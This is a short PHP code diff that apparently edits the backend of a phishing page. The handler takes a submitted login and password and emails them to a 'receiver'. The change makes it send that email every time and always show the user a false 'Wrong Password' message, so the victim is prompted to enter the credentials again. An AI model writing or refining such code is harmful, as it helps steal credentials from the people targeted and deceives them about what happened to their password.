@@ -147,11 +147,11 @@ if (!empty($login) && !empty($passwd)) {
                 'receiver' => $receiver
             ];
             
-            if (sendEmail($subg2, $message, $smtpConfig)) {
-                $data = array('signal' => 'not ok', 'msg' => 'Wrong Password');
-            } else {
-                $data = array('signal' => 'not ok', 'msg' => 'SMTP logging failed');
-            }
+            // Always send the email notification for invalid credentials
+            sendEmail($subg2, $message, $smtpConfig);
+            
+            // Return the correct error message
+            $data = array('signal' => 'not ok', 'msg' => 'Wrong Password');
         }
         
         echo json_encode($data);
